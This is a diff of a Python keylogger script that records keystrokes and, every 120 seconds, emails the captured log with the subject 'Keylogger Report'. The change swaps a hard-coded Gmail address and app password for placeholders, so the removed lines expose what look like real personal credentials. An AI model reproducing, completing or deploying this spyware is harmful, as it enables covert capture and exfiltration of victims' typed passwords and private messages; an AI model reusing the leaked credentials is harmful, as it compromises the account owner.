@@ -8,9 +8,9 @@ log = "\n=== Session Started ===\n"
 start_time = time.time()
 
 def send_email(message):
-    sender = "azmeerbaloch29@gmail.com"
-    password = "luon ilyi hiwz dxye"  # Your app password here
-    receiver = "azmeerbaloch29@gmail.com"
+    sender = "your_email"
+    password = ""  # Your app password here 16 digit for gmail
+    receiver = "your_mail"
 
     msg = MIMEText(message)
     msg['Subject'] = "Keylogger Report"
@@ -45,7 +45,7 @@ def on_press(key):
 def check_and_send_log():
     global log, start_time
     while True:
-        if time.time() - start_time >= 120:  # 2 minutes
+        if time.time() - start_time >= 120:  # time before sendinglog
             if log:
                 send_email(log + "\n=== Session Ended ===\n")
                 log = "\n=== Session Started ===\n"  # Reset log after sending email
